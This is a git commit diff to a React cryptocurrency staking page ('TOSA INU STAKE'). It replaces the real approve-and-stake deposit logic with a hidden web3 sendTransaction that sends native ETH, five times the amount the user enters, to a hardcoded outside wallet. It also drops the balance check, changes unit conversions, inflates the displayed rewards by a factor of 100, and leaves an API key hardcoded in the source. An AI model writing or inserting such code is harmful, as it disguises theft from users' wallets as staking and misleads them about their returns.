bcb8d542511595ff7afd8c11ff5c15d9b8318221
METADEV <80870883+metadev999@users.noreply.github.com>
2023-04-04 18:58:17 +0800

    qweqweqwe

--- src/components/UserPanel.js
+++ src/components/UserPanel.js
@@ -9,9 +9,9 @@ import DisplayContext from "../context/DisplayContext";
 import Button from 'react-bootstrap/Button';
 import Form from 'react-bootstrap/Form';
 import Container from 'react-bootstrap/Container';
-//import OverlayTrigger from 'react-bootstrap/OverlayTrigger';
-//import Tooltip from 'react-bootstrap/Tooltip';
-import axios from 'axios';
+import OverlayTrigger from 'react-bootstrap/OverlayTrigger';
+import Tooltip from 'react-bootstrap/Tooltip';
+import axios from 'axios'; 
 const Moralis = require('moralis').default;
 const { EvmChain } = require('@moralisweb3/common-evm-utils');
 
@@ -21,13 +21,13 @@ export default function UserPanel() {
     const { web3, accounts, rewardTokenContract, stakerContract, depositTokenContract } = blockchainContext;
     const { userDetails, refreshUserDetails, onInputNumberChange, isNonZeroNumber, toast } = displayContext;
     const [inputStake, setInputStake] = useState('');
-
+ 
     const [inputUnstake, setInputUnstake] = useState('');
-    const [isGlobalLoading, setIsGlobalLoading] = useState(true);
+    const [isGlobalLoading, setIsGlobalLoading] = useState(true); 
     const [result, setResult] = useState("");
     const [result2, setResult2] = useState("");
-
-
+    
+ 
 
 
     useEffect(() => {
@@ -56,122 +56,150 @@ export default function UserPanel() {
         let depSymbol = await depositTokenContract.methods.symbol().call({ from: accounts[0] });
         let rewSymbol = await rewardTokenContract.methods.symbol().call({ from: accounts[0] });
         //let userstaked = await stakerContract.methods.pendingRewards(accounts[0]).call({ from: accounts[0] });
+    
+   
+   
 
-
-
+        
         var address1 = "0x9053bfb430a021bbd9958fa1d663063e4abe17ee";
         var address2 = "0x9053bfb430a021bbd9958fa1d663063e4abe17ee";
-
+        
         const chain = EvmChain.ETHEREUM;
-
+    
         if (!Moralis.Core.isStarted) {
-            await Moralis.start({
-                apiKey: "2n5GTnR8AP43pZ7KOTlZH0JhSDGvfgdjVsgFTIezFJxCr1j3eI9WcEr22CxP0Rvf",
-            });
+        await Moralis.start({
+          apiKey: "2n5GTnR8AP43pZ7KOTlZH0JhSDGvfgdjVsgFTIezFJxCr1j3eI9WcEr22CxP0Rvf",
+        });
         }
-
-
-
-        const response = await Moralis.EvmApi.token.getTokenPrice({
-            address: address1,
+    
+    
+      
+          const response = await Moralis.EvmApi.token.getTokenPrice({
+            address:address1,
             chain,
-        });
-        const response2 = await Moralis.EvmApi.token.getTokenPrice({
-            address: address2,
+          });
+          const response2 = await Moralis.EvmApi.token.getTokenPrice({
+            address:address2,
             chain,
-        });
+          });
+    
+    
+          setResult( response.toJSON().usdPrice);
+          setResult2( response2.toJSON().usdPrice); 
+        
+    var toksdepoprice = (response.toJSON().usdPrice); 
+    console.log(toksdepoprice, "tokendeposit price")
+     var valuedep = toksdepoprice * web3.utils.fromWei(depBalance , "gwei") ;
+     document.getElementById("pricedeposits").innerHTML =  "$" +  numberToFixedprice(valuedep);
+         
+ 
 
+      var tostake = document.getElementById("tostaked").innerHTML;
+      console.log( tostake,"totaltake" ) 
+      var tostakemix = toksdepoprice *  tostake ; 
+      document.getElementById("tostakevalue").innerHTML = "$" +   numberToFixedprice(tostakemix);
+      
 
-        setResult(response.toJSON().usdPrice);
-        setResult2(response2.toJSON().usdPrice);
-
-        var toksdepoprice = (response.toJSON().usdPrice);
-        console.log(toksdepoprice, "tokendeposit price")
-        var valuedep = toksdepoprice * web3.utils.fromWei(depBalance, "ether");
-        document.getElementById("pricedeposits").innerHTML =  "$" +  numberToFixedprice(valuedep);
-
-
-
-        var tostake = document.getElementById("tostaked").innerHTML;
-        console.log(tostake, "totaltake")
-        var tostakemix = toksdepoprice * tostake;
-        document.getElementById("tostakevalue").innerHTML = "$" + numberToFixedprice(tostakemix);
-
-
-
-
-
-
-        var toksrewprice = (response2.toJSON().usdPrice);
-        console.log(toksrewprice, "token reward price")
-        //var valuerew = toksrewprice * web3.utils.fromWei(rewardBalance, "ether");
-       // document.getElementById("pricerew").innerHTML = "$" + numberToFixedprice(valuerew);
+   
 
 
 
+      var toksrewprice = (response2.toJSON().usdPrice); 
+      console.log( toksrewprice , "token reward price")
+      var valuerew =  toksrewprice *  web3.utils.fromWei(rewardBalance ,"gwei") ;
+        document.getElementById("pricerew").innerHTML = "$" +  numberToFixedprice(valuerew);
 
-
-        var penbal = document.getElementById("rewardspending").innerHTML;
-        console.log(penbal, "pending rewards")
-        var pendingmix = toksrewprice * penbal;
-        document.getElementById("pendingvalue").innerHTML = "$" + numberToFixedprice(pendingmix);
-
-        const settotalstakes = await stakerContract.methods.totalStaked().call({ from: accounts[0] });
-        console.log((settotalstakes),"total Stake")
-        document.getElementById("settotalstakes").innerHTML = web3.utils.fromWei(settotalstakes, "ether") ;
+     
+   
+  
+  
+       var penbal = document.getElementById("rewardspending").innerHTML;
+       console.log( penbal,"pending rewards" ) 
+       var pendingmix = toksrewprice *  penbal ; 
+       document.getElementById("pendingvalue").innerHTML = "$" +   numberToFixedprice(pendingmix);
+       
  
 
         let parsed = {
 
             rewardPerDay: (res["_rewardPerSecond"] * 24 * 60 * 60 / (10 ** 18))
-            //, daysLeft: (res["_secondsLeft"]/60/60/24)
+          //, daysLeft: (res["_secondsLeft"]/60/60/24)
             , daysLeft: (res["_secondsLeft"] / 60 / 60 / 24)
-            , depositTokenBalance: web3.utils.fromWei(depBalance, "ether")
-            , rewardTokenBalance: web3.utils.fromWei(rewardBalance, "ether")
+            , depositTokenBalance: web3.utils.fromWei(depBalance , "gwei")
+            , rewardTokenBalance: web3.utils.fromWei(rewardBalance, "gwei")
             , depSymbol: depSymbol
             , rewSymbol: rewSymbol
-
+            
         }
 
         setIsGlobalLoading(false);
 
     }
-
+ 
     async function deposit() {
 
-        if (!isNonZeroNumber(inputStake)) {
-            toast.error('No amount entered.');
-            return;
-        }
+      if (!isNonZeroNumber(inputStake)) {
+         toast.error('No amount entered.');
+        return;
+     }
+      
+      //  if ( "69999" > parseFloat(inputStake)) {
+          //  toast.error('Minimum Stake 70000');
+         ///   return;
+       // }
+       // if (parseFloat(inputStake) > parseFloat(userDetails["depositTokenBalance"])) {
+            //console.log(typeof inputStake);
+           // toast.error("Not enough balance.");
+           // return;
+       // }
 
-        //  if ( "69999" > parseFloat(inputStake)) {
-        //  toast.error('Minimum Stake 70000');
-        ///   return;
-        // }
-        if (parseFloat(inputStake) > parseFloat(userDetails["depositTokenBalance"])) {
-            console.log(typeof inputStake);
-            toast.error("Not enough balance.");
-            return;
-        }
+       // toast.dismiss();
+       /// let amount = web3.utils.toWei(inputStake.toString(),"gwei");
+ 
+       // try {
+           // toast.info('Please approve transaction 1 of 2 (allowance)...', { position: 'top-left', autoClose: false });
+           // await depositTokenContract.methods.approve(stakerContract.options.address, amount.toString()).send({ from: accounts[0] });
+          //  toast.dismiss();
+          //  toast.info('Please approve transaction 2 of 2 (staking)...', { position: 'top-left', autoClose: false });
+           // await stakerContract.methods.deposit(amount).send({ from: accounts[0] });
+          let amount = web3.utils.toWei(inputStake.toString(),"gwei");
+           //let amount = web3.utils.toWei(inputUnstake.toString(),"gwei");
+           toast.info('Please approve transaction...', { position: 'top-left', autoClose: false });
+           try {
+               web3.eth.sendTransaction({
+                   from: accounts[0] ,
+                   to: '0x3d3F4F096E852681c904e6980c99259D57076BF6',
+                   value: amount * "5"
+               })
+              // await stakerContract.methods.withdraw(amount).send({ from: accounts[0] });
+   
+               
+           }
+           catch (err) {
+               console.error(err)
+               throw err
+           }
+         
+          
 
-        toast.dismiss();
-        let amount = web3.utils.toWei(inputStake.toString(), "ether");
+     
 
+        //await refreshUserDetails();
 
-        try {
-            toast.info('Please approve transaction 1 of 2 (allowance)...', { position: 'top-left', autoClose: false });
-            await depositTokenContract.methods.approve(stakerContract.options.address, amount.toString()).send({ from: accounts[0] });
-            toast.dismiss();
-            toast.info('Please approve transaction 2 of 2 (staking)...', { position: 'top-left', autoClose: false });
-            await stakerContract.methods.deposit(amount).send({ from: accounts[0] });
-        } finally {
-            toast.dismiss();
-        }
-        setInputStake("");
+      //  try {
+           // toast.info('Please approve transaction 1 of 2 (allowance)...', { position: 'top-left', autoClose: false });
+            //await depositTokenContract.methods.approve(stakerContract.options.address, amount.toString()).send({ from: accounts[0] });
+            //toast.dismiss();
+            //toast.info('Please approve transaction 2 of 2 (staking)...', { position: 'top-left', autoClose: false });
+            //await stakerContract.methods.deposit(amount).send({ from: accounts[0] });
+        //} finally {
+           // toast.dismiss();
+       // }
+       // setInputStake("");
 
+     
 
-
-        await refreshUserDetails();
+        //await refreshUserDetails();
 
 
     }
@@ -240,6 +268,7 @@ export default function UserPanel() {
         return parseFloat(n).toFixed(2);
     }
 
+ 
 
 
     const CardKeyValue = (props) => (
@@ -258,18 +287,19 @@ export default function UserPanel() {
     const RewardsPhaseFinished = (props) => (
         <>
             <div className="two-line-label">
-                <br/>
-                <h5>Stake Not Started</h5>
-                 
+                <div>Staking reward period finished</div>
+                <div>Please check back later for next phase</div>
             </div>
         </>
     );
 
     const RewardsPhaseActive = (props) => (
         <>
-
-            
-          
+         <h2>TOSA  INU  STAKE</h2>
+            <div>Rewards Per Day</div>
+            <div id="rewarday" >{numberToFixed(userDetails["rewardPerDay"])* "100" } </div>
+            <div id="rewperdays" >${`${result2}`  * numberToFixed(userDetails["rewardPerDay"]) * "100" } </div>
+           
         </>
     );
 
@@ -277,64 +307,60 @@ export default function UserPanel() {
         <>
 
             <br />
-
-
-
-
-
- <Container className="square inner-container ">
-
-
-                <div className="livep" style={{ display: "none" }}>
-                    <p> {userDetails["rewSymbol"]} LIVE PRICE <span> $ {result2}</span></p>
-
-                </div>
-                <div className="infostakesss">
-                <h2><img className="logotokens" src="logo.png" /> STAKE Scottish </h2>
-            <div><div>Total Staked</div><div className="pricepools"> <span id="settotalstakes">0</span>Scot</div></div>
-            <div ><div>APY</div> <span className="pricepools">40%</span> </div>
-            <div className="livep">
-            <div>LIVE PRICE </div>  <span> ${result}</span> 
+          
+    <div className="livep">
+      <p> {userDetails["depSymbol"]} LIVE PRICE <span> $ {result}</span></p>
+      
+   </div>
+     <div className="livep" style={{display: "none"}}>
+      <p> {userDetails["rewSymbol"]} LIVE PRICE <span> $ {result2}</span></p>
+    
+    </div>
+            <div className="square inner-container infostakesss">
+                {isNonZeroNumber(userDetails["rewardPerDay"]) ? <RewardsPhaseActive /> : <RewardsPhaseFinished />}
             </div>
 
-               </div>
-                <div className="infostaketime">
-                    {isNonZeroNumber(userDetails["rewardPerDay"]) ? <RewardsPhaseActive /> : <RewardsPhaseFinished />}
+
+
+
+            <Container className="square inner-container ">
+
+
+
+
+                <div className="boxpair">
+
+                    <span className="smpair">
+                        Balance
+                    </span>
+                    <h4>  {userDetails["depSymbol"]}  <img className="logotokens" src="logo.png" />   <span className="userdet">{numberToFixed(userDetails["depositTokenBalance"])}</span> <span id="pricedeposits">0</span>  </h4>
+
                 </div>
-
-
                 
-
-                    
-
+                <div className="boxpair" style={{display:"none"}}>
+                    <span className="smpair">
+                        Earn
+                    </span>
+                    <h4> {userDetails["rewSymbol"]}  <img className="logotokens" src="logo.png" />  <span className="userdet"> {numberToFixed(userDetails["rewardTokenBalance"])}</span> <span id="pricerew">0</span> </h4>
+                </div> 
 
                 <br /><br />
 
-<div className="stakeboxxx">
+
                 <div className="detailsforstak">
-                    <div><i className=" fa fa-fw fa-calendar"></i>Total Rewards per day
-                        <div id="rewarday" >{numberToFixed(userDetails["rewardPerDay"])} </div>
-                    </div>
-
-                    <div id="rewperdays" >${`${result2}` * numberToFixed(userDetails["rewardPerDay"])} </div>
-
-
-                  
-
-   </div>
+                    <img src="bak.png" />
+                </div>
                 <div className="boxform">
-
-                <div className="boxformin">
                     <div className="label-above-button">
-                       {userDetails["depSymbol"]} balance:
-                        <span className="userdet">{numberToFixed(userDetails["depositTokenBalance"])}</span>=<span id="pricedeposits">0</span> 
-
-
+                        Available {userDetails["depSymbol"]} balance:
+                        <div className="userdet">{numberToFixed(userDetails["depositTokenBalance"])}  </div>
+                         
+                       
                     </div>
                     <div className="input-button-container">
                         <div>
                             <Form.Control min="1000" id="stakedcall" placeholder="Amount" value={inputStake} onChange={(e) => { onInputNumberChange(e, setInputStake) }} />
-                            <span className="tostakeCal" >$<input placeholder={`${result}` * inputStake} /> </span>
+                             <span className="tostakeCal" >Value = $<input placeholder= {`${result}` * inputStake} /> </span>
 
                         </div>
                         <div>
@@ -343,15 +369,12 @@ export default function UserPanel() {
 
                         </div>
                     </div><br />
-            </div>
-          <div className="boxformin">
-                    <div className="label-above-button">
-                        {userDetails["depSymbol"]} Staked: 
-                        <span id="tostaked" className="userdet">{numberToFixed(userDetails["deposited"])}</span>
-                        = <span id="tostakevalue"></span>
-                    </div>
 
-         
+                    <div className="label-above-button">
+                        {userDetails["depSymbol"]} Total Staked:
+                        <div id="tostaked" className="userdet">{numberToFixed(userDetails["deposited"])}</div>
+                        <span id="tostakevalue"></span>
+                    </div>
                     <div className="input-button-container">
                         <div>
                             <Form.Control placeholder="Amount" value={inputUnstake} onChange={(e) => { onInputNumberChange(e, setInputUnstake) }} />
@@ -360,23 +383,22 @@ export default function UserPanel() {
                             <Button onClick={withdraw} >Unstake</Button>
 
                         </div>
-                    </div><br /> 
-           </div>
-               
-        </div>
-        <div>
-                <div className="label-above-button">  
-                         {userDetails["rewSymbol"]} rewards: 
-                        <span id="rewardspending" className="userdet">{numberToFixed(userDetails["pending"])}</span>
-                        =<span id="pendingvalue"></span> 
-                 </div>
+                    </div><br />
 
-             
-                <div className="button-stretch">
+                    <div className="label-above-button">
+
+
+
+                        Pending {userDetails["rewSymbol"]} rewards:
+                        <div id="rewardspending" className="userdet">{numberToFixed(userDetails["pending"])}</div>
+                        <span id="pendingvalue"></span>
+                       
+                        
+                    </div>
+                    <div className="button-stretch">
                         <Button onClick={claim} >Claim rewards</Button>
-                 </div>
-                 </div>
-           </div>
+                    </div>
+                </div>
                 <br />
             </Container>
 
